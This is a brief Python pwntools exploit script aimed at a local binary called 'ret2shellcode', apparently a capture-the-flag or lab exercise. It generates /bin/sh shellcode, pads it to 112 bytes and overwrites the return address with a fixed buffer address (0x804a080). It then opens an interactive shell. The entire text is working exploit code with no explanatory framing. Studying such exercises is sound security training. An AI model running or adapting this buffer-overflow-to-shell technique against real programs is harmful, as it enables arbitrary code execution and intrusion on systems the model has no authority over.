from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2 = 0x804a080

sh.sendline(shellcode.ljust(112, 'A') + p32(buf2))
sh.interactive()
